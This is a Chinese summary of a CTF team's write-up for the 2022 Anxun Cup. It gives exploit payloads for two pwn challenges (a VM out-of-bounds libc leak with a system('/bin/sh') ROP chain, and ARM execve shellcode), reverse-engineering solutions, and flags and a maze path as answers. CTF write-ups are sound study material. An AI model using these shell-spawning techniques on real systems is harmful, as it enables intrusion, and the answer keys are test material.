---
title: 第五届安洵杯"网络安全挑战赛WriteUp By F61d
contest: 安洵杯
year: 2022
difficulty: medium
vuln_type: pwn_unknown
tags: [PWN-BF逆向,PWN-ARM-QEMU,RE-RC4,RE-VM保护,Z3求解,RE-迷宫,Web-Babyphp]
attack_chain: Babybf: 逆向BF指令p8(0x3e)+p8(0x2e)+p8(0x2d)→越界读泄libc-231-__libc_start_main+越界写ret+pop_rdi+system(/bin/sh)|Babyarm: ARM架构QEMU base64换表+BSS段写shellcode add r0,pc#12 mov r1,0 mov r2,0 mov r7,11 svc 0|Reee: sub_401640→loc_4011B0有花指令→e8 patch掉→sub_401050+sub_401130为RC4加密→直接解密|re1: 虚拟机保护(VM)→指针函数循环模拟指令→打印伪汇编→z3约束求解(0xF1/0xF2/0xF5/0xF6/0xF8/0xF9指令)|re2: 改输入的RC4+虚假flag→sub_402A80 off_40665C→sub_402780→loc_4027F0花指令→3f patch f5→75步迷宫(初始(2,2)+斜线移动)
key_payload: cmd(p8(0x3e)*0x58+(p8(0x2e)+p8(0x3e))*8+p8(0x2d)*8)|sla('msg>','s1mpl3Dec0d4r') payload='a'*0x28+p32(elf.bss()+0x3c)+p32(0x10c00) shellcode add r0,pc,#12 mov r1,#0 mov r2,#0 mov r7,#11 svc 0 .ascii "/bin/sh\0"|z3 BitVec x[i] dest[64+i]==data[i]|dssaaasasssdsddddwddssasaaassdsssaasssddssasaassaaassdsdsssaaassddddsdssasa|flag{Ju$t_e@sy_vM}
one_liner: F61d战队第二名WP,2道PWN+4道RE+Web:Babybf(BF指令越界读libc+越界写system)+Babyarm(ARM QEMU shellcode)+Reee(花指令+RC4)+re1(VM虚拟机保护+z3约束)+re2(虚假RC4+迷宫75步斜线移动)
lesson: 1) BF(BrainFuck)类VM用p8(0x3e=+)、p8(0x2e=.)、p8(0x2c=,)、p8(0x2d=-)对应[]<>+-等指令; 2) ARM架构QEMU启动NX+PIE实际无效,bss+0x3c=ret_addr可执行shellcode; 3) VM保护程序反编译识别指针函数循环模拟指令,需先打印伪汇编再z3约束; 4) 迷宫题关键:识别初始位置(2,2)+斜线移动(w/a/s/d对应↖↙↗↘)+75步; 5) 花指令patch:e8(call)→90(nop)或3f→f5; 6) ARM svc 0=Linux系统调用,mov r7,#11=execve,add r0,pc,#12="/bin/sh\0"位置
quality: high
---

## 备注

原文(https://www.ctfiot.com/81036.html)F61d战队第二名WP,作者吐槽"被小姐姐带飞"。涵盖5题(2 PWN + 3 RE + 部分Web)。

### 题目清单

**PWN-Babybf** — 字节码VM越界
- 指令:0x3e=ptr++, 0x2c=ptr--, 0x2e=value++, 0x2d=value--
- cmd(p8(0x3e)*0x58+(p8(0x2e)+p8(0x3e))*8+p8(0x2d)*8) — 0x58次ptr右移+8次value++左移+8次value-- → 越界读
- libc-2.27:u64(p.recv(6))-231-libc.sym['__libc_start_main'] = libcbase
- 第二次cmd(p8(0x3e)*0x38+(p8(0x2c)+p8(0x3e))*0x20)越界写
- p.send(p64(poprdi+1)+p64(poprdi)+p64(binsh)+p64(system))

**PWN-Babyarm** — ARM QEMU
- s1mpl3Dec0d4r口令
- payload='a'*0x28+p32(elf.bss()+0x3c)+p32(0x10c00)
- shellcode:`add r0, pc, #12; mov r1, #0; mov r2, #0; mov r7, #11; svc 0; .ascii "/bin/sh\0"`

**RE-Reee** — 花指令+RC4
- sub_401640入口
- loc_4011B0花指令 e8→90 patch
- sub_401050/sub_401130为RC4,工具直接解密

**RE-re1** — VM保护
- 16个this[0..15] slot,指令0xF1(load/store)/0xF2(xor)/0xF5(read)/0xF6(right_shift)/0xF8(add)/0xF9(sub)
- 12字节dest[32..43]输入,经ebx+=k,ebx&=0xff,eax^=ebx,eax-=k 13轮加密
- 比较data[0xA7,0x3A,0x19,0xB4,0xF1,0x49,0x2B,0xCB,0xEA,0x0E,0x0E,0x14]
- z3 BitVec约束求解:dest[64+i]==data[i]
- 还原flag:`tmp=((tmp<<6)|(tmp>>2))&0xff; tmp^=ord('a')+i-1`
- 答案:`flag{Ju$t_e@sy_vM}`

**RE-re2** — 改输入RC4+迷宫
- sub_402A80 off_40665C→sub_402780→loc_4027F0花指令 3f→f5 patch
- 75步迷宫,从(2,2)开始,斜线移动(非上下左右)
- 结果:`dssaaasasssdsddddwddssasaaassdsssaasssddssasaassaaassdsdsssaaassddddsdssasa`

## 评级

- **quality: high** — 5题全链完整,BF指令逆向+ARM QEMU+VM保护z3+迷宫斜线移动,典型PWN+RE合集
- **vuln_type: pwn_unknown** — PWN为主,涵盖BF/ARM/VM三种逆向;RE作为辅助
- F61d战队第二名实战WP
